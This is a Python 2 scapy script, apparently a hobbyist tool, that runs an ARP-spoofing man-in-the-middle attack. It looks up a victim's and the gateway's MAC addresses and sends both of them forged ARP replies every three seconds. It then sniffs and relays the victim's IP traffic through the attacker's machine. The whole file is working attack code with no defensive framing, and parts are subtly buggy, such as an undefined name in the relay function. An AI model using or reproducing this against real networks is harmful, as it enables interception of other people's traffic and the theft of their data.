import subprocess
import sys
from scapy.all import *
import thread, time

FLAG=0	

def del_section(packet):
	if(packet.haslayer(UDP)):
		del packet[UDP].chksum
		del packet[UDP].len
		del packet.chksum
		del packet.len
		return packet

	elif(packet.haslayer(TCP)):
		del packet[TCP].chksum
		del packet.chksum
		del packet.len
		return packet

	elif(packet.haslayer(ICMP)):
		del packet[ICMP].chksum
		del packet.chksum
		del packet.len
		return packet
	
	else:
		return packet

def spoof_arp(arp_reply, arp_replyg):
	while(1):
		send(arp_reply)
		send(arp_replyg)
		time.sleep(3)

def relay(packet):
	global FLAG
	while(1):
		if (FLAG == 0):
			break
	FLAG=1

	if (packet.haslayer(ARP)): #spoof when gateway request...
		if(packet[ARP].op == who_has and packet.psrc == gateway):
			send(arp_reply)
			send(arp_replyg)
		return
	
	if (packet.haslayer(IP) <= 0): #sniff filter dosen't work sometimes..
		return

	if (packet[IP].src == VICT_IP):
		packet[Ether].src = MY_MAC
		packet[Ether].dst = gateMAC
		packet = del_section(packet) #optional..?
		print "packet from victim"
		sendp(packet)

	if (packet[IP].dst == VICT_IP):
		packet[Ether].src = MY_MAC
		packet[Ether].dst = vict_MAC
		packet = del_section(packet) #optional..?
		print "packet to victim"
		sendp(packet)
		
		
	FLAG=0
	


if len(sys.argv) != 4:
	print "Usage: python argv.py VICT_IP MY_IP MY_MAC"
	sys.exit(1)


############# mapping argvs
VICT_IP = sys.argv[1]
MY_IP = sys.argv[2]
MY_MAC = sys.argv[3]

############# ARP request
arp_packet = sr1(ARP(op=ARP.who_has, psrc = MY_IP, pdst=VICT_IP))
summary=arp_packet.summary()
summary_split = summary.split()
vict_MAC = summary_split[summary_split.index('at')+1] ## get mac

print "vict_MAC: " +  vict_MAC

############# get gateway IP addr
output= subprocess.check_output(["route"])
output_split = output.split()
gateway = output_split[output_split.index('default') +1]

print "gateway IP: " + gateway

############ get gateway MAC
output2 = subprocess.check_output(["arp", "-a"]).split()
gateMAC = output2[output2.index("(" + gateway + ")")+2]
print "gateMAC : " + gateMAC

############# send spoofed ip
arp_reply = ARP(op=ARP.is_at, hwsrc = MY_MAC, 
		psrc=gateway, hwdst=vict_MAC, pdst=VICT_IP)
arp_replyg = ARP(op=ARP.is_at, hwsrc = MY_MAC, 
		hwdst=gateMAC, psrc=VICT_IP, pdst=gateway)

############# thread sends arp_spoof every 3 sec
thread.start_new_thread(spoof_arp, (arp_reply, arp_replyg))

############# sniff
sniff(filter="ip" , prn=relay)




